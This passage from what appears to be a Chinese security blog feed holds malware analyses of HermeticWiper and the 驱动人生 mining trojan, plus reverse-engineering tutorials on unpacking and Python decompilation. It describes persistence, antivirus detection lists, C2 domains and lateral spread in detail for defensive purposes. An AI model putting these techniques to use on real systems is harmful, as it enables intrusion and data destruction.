src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094031703.png" alt="image-20220414094031703"></p><p>样本包含了四个资源。通过SZDD头部信息可知均为微软自带的压缩格式，使用了微软的压缩命令工具“compress.exe”进行了压缩。使用expand命令解压后，通过文件签名和hash比对，发现这些驱动程序是商用数据恢复和磁盘管理软件“EaseUS Partition Master”的多个系统版本，包括x86和x64架构。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094100796.png" alt="image-20220414094100796"></p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094143835.png" alt="image-20220414094143835"></p><h3 id="动态运行分析"><a href="#动态运行分析" class="headerlink" title="动态运行分析"></a>动态运行分析</h3><p>虚拟机及沙箱运行样本后发现，样本会释放驱动程序，并进行安装，修改注册表，并大量枚举文件和目录，访问硬盘引导扇区，导致系统重启后显示“Missing operating system”。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094228752.png" alt="image-20220414094228752"></p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094238939.png" alt="image-20220414094238939"></p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094247118.png" alt="image-20220414094247118"></p><p>初步怀疑该样本通过利用驱动程序与存储设备进行交互，获取底层磁盘访问及检索分区信息的能力，进而修改硬盘存储的主引导记录、文件等信息，达到恶意擦除、摧毁数据的目的。</p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>首先样本会进行提权操作，为下一步枚举文件及目录做准备。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414110431872.png" alt="image-20220414110431872"></p><p>禁用卷影拷贝服务(vss)来禁用故障转储，破坏系统的备份。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094359696.png" alt="image-20220414094359696"></p><p>判断操作系统的版本和系统位数，根据结果加载四个资源文件中的其中一个资源文件。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094416604.png" alt="image-20220414094416604"></p><p>将注册表<em>HKLM\System\CurrentControlSet\Control\CrashControl\CrashDumpEnabled</em>键值设置为0，并获取所有物理磁盘的编号。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094441573.png" alt="image-20220414094441573"></p><p>将解压出的资源文件释放至*C:\Windows\System32\drivers*目录下并安装。安装成功后，与服务相关的注册表项以及删除的文件都将被删除，以使新驱动程序更难被发现。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094501429.png" alt="image-20220414094501429"></p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094508536.png" alt="image-20220414094508536"></p><p>最后进行数据删除。枚举0-100一系列物理驱动器，对于每个物理驱动器，.\PhysicalDrive%u都会调用设备以获取设备编号，并删除从0-100序号的所有物理驱动器中的C:\SystemVolume Information文件夹，防止系统通过还原点及备份恢复数据。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094528656.png" alt="image-20220414094528656"></p><p>对NTFS和FAT驱动器类型分别进行数据擦除处理。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094543758.png" alt="image-20220414094543758"></p><p>擦除<em>C:&#x2F;Documents and settings</em>文件夹中的内容，并销毁系统日志。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414105723656.png" alt="image-20220414105723656"></p><h2 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h2><p><strong>MD5：</strong></p><p>3F4A16B29F2F0532B7CE3E7656799125</p><p>6106653B08F4F72EEAA7F099E7C408A4</p><p>093CEE3B45F0954DCE6CB891F6A920F7</p><p>BDF30ADB4E19AFF249E7DA26B7F33EAD</p><p>D57F1811D8258D8D277CD9F53657EEF9</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>HermeticWiper 病毒利用合法驱动程序的数字签名，绕过某些Windows安全机制，同时利用驱动程序与存储设备进行交互，获取底层磁盘访问及检索分区信息的能力，进而对磁盘上的 MBR 和分区进行覆盖，使得数据几乎不可能恢复。并且该病毒对于隐匿痕迹以及阻止系统恢复的模块很有参考价值，增加了取证分析人员的工作难度。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.malwarebytes.com/threat-intelligence/2022/03/hermeticwiper-a-detailed-analysis-of-the-destructive-malware-that-targeted-ukraine/">https://blog.malwarebytes.com/threat-intelligence/2022/03/hermeticwiper-a-detailed-analysis-of-the-destructive-malware-that-targeted-ukraine/</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HermeticWiper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ESP定律手动脱壳</title>
    <link href="/2022/04/12/ESP%E5%AE%9A%E5%BE%8B%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/"/>
    <url>/2022/04/12/ESP%E5%AE%9A%E5%BE%8B%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h4 id="手工脱壳常用方法"><a href="#手工脱壳常用方法" class="headerlink" title="手工脱壳常用方法"></a>手工脱壳常用方法</h4><ol><li>单步跟踪法  </li><li>ESP定律法 </li><li>内存镜像法 </li><li>一步到达OEP </li><li>最后一次异常法</li><li>模拟跟踪法</li><li>“SFX”法</li></ol><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><ul><li><strong>PUSHAD</strong>（入栈&#x2F;压栈）：代表程序的入口点</li><li><strong>POPAD</strong>（弹栈&#x2F;出栈）：代表程序的出口点，与PUSHAD想对应，一般找到这个OEP就在附近</li><li><strong>OEP</strong>（Original Entry Point）：程序的入口点，软件加壳就是隐藏了OEP（或者用了假的OEP&#x2F;FOEP），只要我们找到程序真正的OEP，就可以立刻脱壳</li><li><strong>Dump</strong>：就是转存，在加壳程序中找到入口点，将内存中进程数据保存到硬盘里（普遍用的都是<em>LordPE</em>工具）</li><li><strong>IAT</strong>（Import Address Table ）：就是导入函数的地址表，这段地址存放的就是源程序的API函数地址（通常使用<em>ImportRce</em>修复脱壳时的地址表）</li></ul><h4 id="ESP定律脱壳"><a href="#ESP定律脱壳" class="headerlink" title="ESP定律脱壳"></a>ESP定律脱壳</h4><p><strong>ESP定律的原理</strong>：堆栈平衡原理。</p><p><strong>适用范围</strong>：几乎全部的压缩壳，部分加密壳。</p><p>​               载入程序单步运行(<em>F8</em>)后，只有ESP、EIP寄存器内容发生变化(<em>变红</em>)，那么这个程序大概率可以试用ESP定律。</p><p><strong>具体步骤</strong>：</p><p>Ollydbg打开target.exe，选择不分析代码。</p><p>F8单步执行一步，寄存器窗口只有ESP和EIP的值变红。</p><p>右键ESP，选择“<em>数据窗口中跟踪</em>”。</p><img src="image-20220412102857858.png" alt="image-20220412102857858" style="zoom: 67%;" /><p>在数据窗口，对ESP位置设置硬件断点。右键断点-硬件访问，任意一个类型。</p><img src="image-20220412103258956.png" alt="image-20220412103258956" style="zoom:50%;" /><p>然后F9一键运行程序，会停在popad指令，即恢复源程序环境指令附近。到这里也就说明它的壳环境执行完毕，OEP的位置也就不远了。然后选择调试-硬件断点，删除硬件断点。</p><img src="image-20220412105333517.png" alt="image-20220412105333517" style="zoom: 67%;" /><p>单步执行F8到了<em>jnz</em>位置后，点击它的下一行，然后F4让程序强制转到跳转下面继续运行，F8到达<em>jmp</em>后跳转到程序的OEP领空，确认OEP的位置。</p><img src="image-20220412110708313.png" alt="image-20220412110708313" style="zoom:50%;" /><p>然后，右击程序当前位置第一行代码，选择<em>用OllyDump脱壳调试进程</em>；</p><img src="image-20220412110153981.png" alt="image-20220412110153981" style="zoom:50%;" /><p>最后，我们在弹出的窗口中选择<em>脱壳</em>，然后，输入要另存为的文件名。该文件即为脱壳程序（没有重建IAT）。</p><img src="image-20220412110258393.png" alt="image-20220412110258393" style="zoom:50%;" /><p>如果没有OllyDump插件可以选择使用LordPE进行抓取内存数据。如下：</p><p>Ollydbg运行到OEP位置处，打开LordPE工具，选中脱壳程序target.exe右击<em>纠正镜像大小</em>（防止误读），再次右击选择<em>完全脱壳</em>，转存为dumped.exe。</p><p>然后修复输入表，打开ImportRCE工具，选择带壳程序进程target.exe，刚加载该程序进程的时候，它的OEP并不准确，将程序的实际OEP地址填进去，点击“<em>自动查找IAT</em>”，<em>获取输入表</em>，最后“<em>转储到文件</em>”选择dumped_.exe。</p><p>dumped_.exe即为脱壳程序。</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>脱壳</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python exe文件的编译与反编译</title>
    <link href="/2022/04/12/Python-exe%E6%96%87%E4%BB%B6%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    <url>/2022/04/12/Python-exe%E6%96%87%E4%BB%B6%E7%9A%84%E7%BC%96%E8%AF%91%E4%B8%8E%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h3 id="编译Python-代码"><a href="#编译Python-代码" class="headerlink" title="编译Python 代码"></a>编译Python 代码</h3><figure class="highlight cmake"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> pyinstaller <br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">pyinstaller.<span class="hljs-keyword">exe</span> -F *编译的<span class="hljs-keyword">python</span>文件<span class="hljs-keyword">py</span>*<br></code></pre></td></tr></table></figure><h3 id="反编译Python-EXE"><a href="#反编译Python-EXE" class="headerlink" title="反编译Python EXE"></a>反编译Python EXE</h3><h4 id="下载pyinstxtractor"><a href="#下载pyinstxtractor" class="headerlink" title="下载pyinstxtractor"></a>下载pyinstxtractor</h4><p><a href="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a></p><h4 id="使用pyinstxtractor"><a href="#使用pyinstxtractor" class="headerlink" title="使用pyinstxtractor"></a>使用pyinstxtractor</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> pyinstxtractor.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;filename&gt;</span><br></code></pre></td></tr></table></figure><h4 id="找到相应的pyc文件"><a href="#找到相应的pyc文件" class="headerlink" title="找到相应的pyc文件"></a>找到相应的pyc文件</h4><p>运行后生成xx.exe_extracted文件夹，找到相应的pyc文件（文件夹内的PYZ-00.pyz_extracted文件夹是引入的依赖库）</p><h4 id="反编译pyc文件"><a href="#反编译pyc文件" class="headerlink" title="反编译pyc文件"></a><strong>反编译pyc文件</strong></h4><p>在线反编译 <a href="http://tools.bugscaner.com/decompyle/">http://tools.bugscaner.com/decompyle/</a></p><p>uncompyle6  <a href="https://github.com/rocky/python-uncompyle6/">https://github.com/rocky/python-uncompyle6/</a></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> uncompyle6<br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">uncompyle6 -o . <span class="hljs-emphasis">*编译的python文件pyc或pyo *</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>驱动人生木马分析</title>
    <link href="/2022/04/11/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"/>
    <url>/2022/04/11/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="样本概况"><a href="#样本概况" class="headerlink" title="样本概况"></a>样本概况</h1><figure class="highlight makefile"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">文件: updll.exe</span><br><span class="hljs-section">大小: 201,776 bytes</span><br><span class="hljs-section">文件签名:Shenzhen Smartspace Software technology Co.,Limited</span><br><span class="hljs-section">修改时间: 2020年12月2日, 14:05:51</span><br><span class="hljs-section">MD5: 59B18D6146A2AA066F661599C496090D</span><br><span class="hljs-section">SHA1: 48A3046381A963A2471875EF67886E35B90E8541</span><br><span class="hljs-section">CRC32: 80488116</span><br></code></pre></td></tr></table></figure><h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><p>首先使用PEiD和ExeInfo工具对样本进行查壳 以下是查壳结果</p><img src="image-20201207093542398.png" alt="image-20201207093542398" style="zoom: 50%;" /><p><strong>结论：</strong>病毒使用VC6编写的  无壳</p><h1 id="基础分析"><a href="#基础分析" class="headerlink" title="基础分析"></a>基础分析</h1><h2 id="基础静态分析"><a href="#基础静态分析" class="headerlink" title="基础静态分析"></a>基础静态分析</h2><h3 id="查看字符串"><a href="#查看字符串" class="headerlink" title="查看字符串"></a>查看字符串</h3><p>首先在IDA中查看程序的字符串信息 看看能否得出某些信息</p><img src="image-20201207095219894.png" alt="image-20201207095219894" style="zoom:50%;" /><p>在IDA中看到字符串中含有AV检测、系统进程svhost.exe、矿机信息I am tHe xmr reporter等。但具体的还需要再进一步确认。</p><img src="image-20201207095805491.png" alt="image-20201207095805491" style="zoom:50%;" /><p>紧接着看到了http链接，有可能是病毒的通联地址。然后就是大量CMD命令，大概是在执行某些恶意操作 。</p><p>字符串的部分目前提取的信息就这么多，主要还是结合进一步的代码分析。</p><h3 id="使用PEiD识别加密算法"><a href="#使用PEiD识别加密算法" class="headerlink" title="使用PEiD识别加密算法"></a>使用PEiD识别加密算法</h3><p>使用PEID的Kyrpto ANALyzer插件扫描病毒程序，来识别加密算法。扫描结果如图所示</p><img src="image-20201207144939176.png" alt="image-20201207144939176" style="zoom:50%;" /><p>由上图可知，该病毒使用RC4加密算法。</p><h3 id="查看导入表"><a href="#查看导入表" class="headerlink" title="查看导入表"></a>查看导入表</h3><img src="image-20201207101230560.png" alt="image-20201207101230560" style="zoom:50%;" /><p>输入表存在ADVAPI32.dll中的注册表和windows服务API，说明有可能该病毒存在创建、操作注册表和windows服务的行为。存在urlmon.dll的URLOpenBlockingStreamA API，有可能从网上URL下载数据（有可能是上面字符串提取的URL）。存在WS2_32.dll Windows Sockets应用程序接口， 用于支持Internet和网络应用程序。</p><p>此处需要留意</p><h3 id="查看资源段"><a href="#查看资源段" class="headerlink" title="查看资源段"></a>查看资源段</h3><p>接着查看病毒的资源段</p><img src="image-20201207103845767.png" alt="image-20201207103845767" style="zoom:50%;" /><p>存在100号、101号、102号三个资源，从资源头看不出是什么文件， 猜测有可能经过加密。</p><h2 id="基础动态分析"><a href="#基础动态分析" class="headerlink" title="基础动态分析"></a>基础动态分析</h2><h3 id="查看进程树"><a href="#查看进程树" class="headerlink" title="查看进程树"></a>查看进程树</h3><p>首先使用<code>ProcessMonitor</code>查看一下进程树。</p><img src="image-20201208111619297.png" alt="image-20201208111619297" style="zoom:50%;" /><h3 id="注册表监控"><a href="#注册表监控" class="headerlink" title="注册表监控"></a>注册表监控</h3><p>使用regshot对运行病毒前后做一个快照进行比对，直接查看结果。</p><img src="image-20201208112814269.png" alt="image-20201208112814269" style="zoom:50%;" /><img src="image-20201208111129817.png" alt="image-20201208111129817" style="zoom:50%;" /><h3 id="文件监控"><a href="#文件监控" class="headerlink" title="文件监控"></a>文件监控</h3><p>接下来是文件的监控</p><img src="image-20201208110819074.png" alt="image-20201208110819074" style="zoom:50%;" /><h3 id="网络监控"><a href="#网络监控" class="headerlink" title="网络监控"></a>网络监控</h3><p>请求恶意DNS域名</p><img src="image-20201209103816961.png" alt="image-20201209103816961" style="zoom:50%;" /><p>上传主机信息，并获取加密数据。</p><img src="image-20201209103458940.png" alt="image-20201209103458940" style="zoom:50%;" /> <h3 id="服务监控"><a href="#服务监控" class="headerlink" title="服务监控"></a>服务监控</h3><p>创建了两个服务：Ddriver和WebServers。</p><img src="image-20201208113024835.png" alt="image-20201208113024835" style="zoom:50%;" /><h1 id="使用IDA进行详细分析"><a href="#使用IDA进行详细分析" class="headerlink" title="使用IDA进行详细分析"></a>使用IDA进行详细分析</h1><p>主程序启动后首先尝试启动名为Ddriver的服务进程，如果主机已经被感染则直接执行服务函数进行挖矿等恶意行为，如果主机是初次被感染则执行感染配置行为。</p><img src="image-20201207105301424.png" alt="image-20201207105301424" style="zoom:50%;" /><p>第一步检查自身名称是否为svhost.exe或者svchost.exe，如果程序名称不为svhost.exe或者svchost.exe则从资源节中解密释放PE文件（102号资源），释放文件的hash：a4b7940b3d6b03269194f728610784d6，最终在磁盘中释放路径为C:\windows\temp\ttt.exe，释放完成后便执行该文件。</p><img src="image-20201207110637362.png" alt="image-20201207110637362" style="zoom:50%;" /><p>释放执行ttt.exe文件后便多次使用cmd命令清理系统原来感染的老版本的挖矿程序，为新版挖矿程序的安装和运行清理环境。结束删除老版的挖矿程序见下图。</p><img src="image-20201207111435563.png" alt="image-20201207111435563" style="zoom:50%;" /><p>设置Windows防火墙开启65531，65532，65533端口，在防火墙规则中分别命名为UDP2，UDP，ShareService，同时开启端口转发，将来自65532端口的流量转发到1.1.1.1地址的53端口，将来自65531端口的流量转发到1.1.1.1地址的53端口。设置防火墙并设置端口代理见下图。</p><p><img src="/2022/04/11/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20201207111615677.png" alt="image-20201207111615677"></p><p>拷贝主程序到C:\windows\system32\svhost.exe并设置隐藏属性，同时拷贝一份到C:\windows\system32\drivers\svchost.exe，之后设置计划任务同时设置注册表项，实现程序的开机启动和定期触发执行。拷贝主程序文件到系统关键目录下、设置计划任务和注册表项见下图。</p><img src="image-20201207112722576.png" alt="image-20201207112722576" style="zoom:50%;" /><img src="image-20201207112801022.png" alt="image-20201207112801022" style="zoom:50%;" /><p>完成上述配置后尝试使用CreateServiceA函数将C:\windows\system32\drivers\svchost.exe注册为服务，如果服务存在则修改服务配置，如果CreateServiceA函数调用失败则使用CMD方式调用sc create创建服务，最终尝试使用net start和StartServiceA函数的方式启动服务函数。创建Ddriver服务的首选方式，启动创建的Ddriver服务见下图。</p><img src="image-20201207113558713.png" alt="image-20201207113558713" style="zoom:50%;" /><img src="image-20201207113711717.png" alt="image-20201207113711717" style="zoom:50%;" /><p>服务主函数中首先根据系统位数拼接后续将要使用到的字符串资源，包括从恶意域名临时下载的文件以及解密之后的文件，和后续用来伪装成任务管理器共享进程进行挖矿操作taskmgr.exe。拼接后续需要使用的字符串见下图。</p><img src="image-20201207130526153.png" alt="image-20201207130526153" style="zoom:50%;" /><p>创建名为“it is holy shit”的互斥体防止进程重复启动运行，根据系统位数解密释放对应的资源文件，64位系统解密释放100号资源，32位系统解密释放标号为101号资源，释放路径为C:\Windows\system32\drivers\taskmgr.exe(64位系统：C:\Windows\SysWOW64\drivers\taskmgr.exe)。利用互斥体防止进程重复启动，根据系统位数释放taskmgr.exe文件见下图。</p><img src="image-20201207132730798.png" alt="image-20201207132730798" style="zoom:50%;" /><img src="image-20201207132921307.png" alt="image-20201207132921307" style="zoom:50%;" /><p>之后创建四个线程分别进行相关的恶意操作，第一个线程根据主机中的进程和主机系统相关参数调整挖矿程序的运行状态，当用户打开任务管理器浏览时会自动关闭伪装程序taskmgr.exe，使其不被用户发现；第二个线程每隔10s尝试启动C:\Windows\temp\svchost.exe(永恒之蓝漏洞攻击文件)，实现内网的横向感染传播；第三个线程使用Wmic命令，每10秒对进程进行一次检查，触发时将结束挖矿进程；第四个线程打开监听65533端口。</p><img src="image-20201207133414011.png" alt="image-20201207133414011" style="zoom:50%;" /><p>收集主机信息并发送到远程服务器，收集的信息包括主机ID，GUID，MAC地址，用户名，系统版本，系统位数，CPU型号，安装的反病毒软件(能够识别的杀软包括:360tray.exe|360sd.exe|avp.exe|KvMonXP.exe|RavMonD.exe|Mcshield.exe|egui.exe|kxetray.exe|knsdtray.exe|TMBMSRV.exe|avcenter.exe|ashDisp.exe|rtvscan.exe|ksafe.exe|QQPCRTP.exe)等等，最终在下载下一步指令的同时将上述信息传输到远程服务器。收集发送到远程服务器的主机信息见下图。</p><img src="image-20201207133857486.png" alt="image-20201207133857486" style="zoom:50%;" /><p>之后尝试访问远程服务器中指定的文件内容，从而获取执行指令，在本地解密后解析执行指令，发送的指令通过RC4+RSA算法进行加密，本地获取指令后通过硬编码的RSA公钥进行解密，最终解析执行远程命令。</p><p>由接受到的*.png中的指令内容下载指定的文件执行，当前指令的意图是从恶意域名http[:]&#x2F;&#x2F;dl.haqo.net&#x2F;下载i.exez资源，该资源为加密状态，下载到本地后解密执行，最终下载解密到C:\windows\temp\svchost.exe，目前下载的程序为永恒之蓝漏洞利用程序，该程序利用445端口实现了病毒的内网横向传播操作，该利用工具中还增加了PASS-THE-HASH的模块，尝试利用内网弱口令进行远程拷贝执行感染操作。下载指定文件解密执行见下图。</p><img src="image-20201207140500099.png" alt="image-20201207140500099" style="zoom:50%;" /><p>释放的ttt.exe文件执行之后会将自身移动到C:\Windows\System32\wmiex.exe(64位系统：C:\Windows\SysWOW64\wmiex.exe)并设置了隐藏属性，将自身写入计划任务，任务名为WebServers，每隔50分钟执行一次C:\Windows\system32\wmiex.exe(64位系统：C:\Windows\SysWOW64\wmiex.exe)，并创建服务WebServers设置为开机自启动。释放的ttt.exe文件被移动到指定路径、释放的ttt.exe（wmiex.exe）文件实现的命令见下图。</p><img src="clip_image002.jpg" alt="img" style="zoom:50%;" /><img src="clip_image004.jpg" alt="img" style="zoom:50%;" /><p>WebServers服务启动后会向指定的三个域名发起Get请求将获取的主机相关信息发送到远程服务器（pp.abbny.com、oo.beahh.com和ii.haqo.net），从而收集主机的相关信息，其中包含主机名，标识主机的GUID，主机MAC地址，主机系统和操作系统位数。上传信息所到的恶意域名见下图。</p><img src="clip_image005.png" alt="img"  /><p>WebServers服务同时具备Ddriver服务的联网功能，通过尝试下载指定域名的u.png文件，图片文件中包含了加密的指令内容，攻击者可以通过编辑该文件从而控制感染主机进行任意操作，也可以修改指令改变所下发的指令内容，当前该文件并不存在，因此WebServers不会执行其他恶意行为，仅仅处于等待指令的状态，在每次开机以及开机状态后每隔50分钟检查接收一次远程指令，wmiex.exe中的代码和svchost主程序中网络相关的代码基本一致，RSA公钥也是一样的，因此在这里算是攻击者的一个重复性操作。wmiex.exe和svchost.exe硬编码的公钥信息见下图。</p><img src="clip_image007.jpg" alt="img" style="zoom:50%;" /><h2 id="对病毒总体行为的总结"><a href="#对病毒总体行为的总结" class="headerlink" title="对病毒总体行为的总结"></a>对病毒总体行为的总结</h2><p>经对比分析，该病毒为“驱动人生”木马，通过驱动人生的升级通道下发。该病毒执行后便会将自身移动到系统关键目录并释放多个文件执行，上传主机的相关信息并从指定的恶意域名查询指令，根据黑客指令执行恶意行为。感染范围是安装了受影响的驱动人生程序的Windows系统，和内网中未打MS17-010系统补丁且开启445端口的Windows系统。</p><table><thead><tr><th><strong>文件行为：</strong></th></tr></thead><tbody><tr><td>下载保存文件到c:\windows\temp\updater.exe，执行后移动到其他位置</td></tr><tr><td>移动文件到c:\windows\system32\svhost.exe，并设置隐藏属性</td></tr><tr><td>拷贝文件到c:\windows\system32\drivers\svchost.exe，并设置隐藏属性</td></tr><tr><td>释放文件到c:\windows\system32\drivers\taskmgr.exe，并设置隐藏属性</td></tr><tr><td>释放文件到c:\windows\system32\wmiex.exe，并设置隐藏属性</td></tr><tr><td>下载文件到c:\windows\temp\svchost，此文件为永恒之蓝漏洞利用工具</td></tr><tr><td>释放文件到c:\windows\temp\m.ps1，此文件为mimikatz密码hash提取工具</td></tr><tr><td>释放文件到c:\windows\temp\mkatz.ini，此文件包含提取本机用户的hash值</td></tr><tr><td>注：在Windows64位系统中c:\windows\system32替换为c\windows\SysWOW64</td></tr></tbody></table><table><thead><tr><th><strong>注册表行为：</strong></th></tr></thead><tbody><tr><td>创建HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Ddriver</td></tr><tr><td>创建HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WebServers</td></tr></tbody></table><table><thead><tr><th><strong>网络行为：</strong></th></tr></thead><tbody><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;i.haqo.net</td></tr><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;p.abbny.com</td></tr><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;o.beahh.com</td></tr><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;ii.haqo.net</td></tr><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;pp.abbny.com</td></tr><tr><td>尝试上传主机信息到http[:]&#x2F;&#x2F;oo.beahh.com</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;i.haqo.net&#x2F;i.png</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;p.abbny.com&#x2F;im.png</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;o.beahh.com&#x2F;i.png</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;ii.haqo.net&#x2F;u.png</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;pp.abbny.com&#x2F;u.png</td></tr><tr><td>尝试获取远控指令信息http[:]&#x2F;&#x2F;oo.beahh.com&#x2F;u.png</td></tr></tbody></table><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><table><thead><tr><th><strong>删除计划任务，结束病毒进程并删除服务：</strong></th></tr></thead><tbody><tr><td>删除名为Ddrivers、WebServers、DnsScan、\Microsoft\Windows\Bluetooths的计划任务</td></tr><tr><td>删除可能存在的计划任务Certificate和Credentials</td></tr><tr><td>结束名为wmiex.exe进程以及描述为“svchost”的svchost进程</td></tr><tr><td>删除名为Ddriver和WebServers的服务项</td></tr></tbody></table><table><thead><tr><th><strong>删除下载和释放的病毒文件：</strong></th></tr></thead><tbody><tr><td>c:\Users[Username]\AppData\Roaming\Microsoft\Windows\Start  Menu\Programs\Startup\run.bat</td></tr><tr><td>c:\Users[Username]\AppData\Roaming\Microsoft\cred.ps1</td></tr><tr><td>c:\programdata\microsoft\cred.ps1</td></tr><tr><td>c:\windows\temp\updater.exe（upinstalled.exe）</td></tr><tr><td>c:\windows\system32\svhost.exe</td></tr><tr><td>c:\windows\system32\drivers\svchost.exe</td></tr><tr><td>c:\windows\system32\drivers\taskmgr.exe</td></tr><tr><td>c:\windows\system32\wmiex.exe</td></tr><tr><td>c:\windows\temp\svchost</td></tr><tr><td>c:\windows\temp\m.ps1</td></tr><tr><td>c:\windows\temp\mkatz.ini</td></tr><tr><td>注：[Username]替换为当前登录的用户名</td></tr></tbody></table><table><thead><tr><th><strong>删除病毒创建的注册表项：</strong></th></tr></thead><tbody><tr><td>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Ddriver</td></tr><tr><td>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WebServers</td></tr></tbody></table><table><thead><tr><th><strong>删除病毒设置的防火墙栏目：</strong></th></tr></thead><tbody><tr><td>删除入站规则名为UDP，开放65532端口的规则</td></tr><tr><td>删除入站规则名为UDP2，开放65531端口的规则</td></tr><tr><td>删除入站规则名为ShareService，开放65533端口的规则</td></tr></tbody></table><table><thead><tr><th><strong>删除病毒设置的端口转发的设置：</strong></th><th></th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>netsh interface  portproxy delete v4tov4 listenport&#x3D;65531</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>netsh interface  portproxy delete v4tov4 listenport&#x3D;65532</td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>  注：通过CMD管理员执行以上命令  </p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/articles/network/196594.html">https://www.freebuf.com/articles/network/196594.html</a></p><p><a href="https://app.any.run/tasks/14168f29-4921-4dc4-a28b-113e3ed9fbe7/">https://app.any.run/tasks/14168f29-4921-4dc4-a28b-113e3ed9fbe7/</a></p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>驱动人生</tag>
      
    </tags>
    
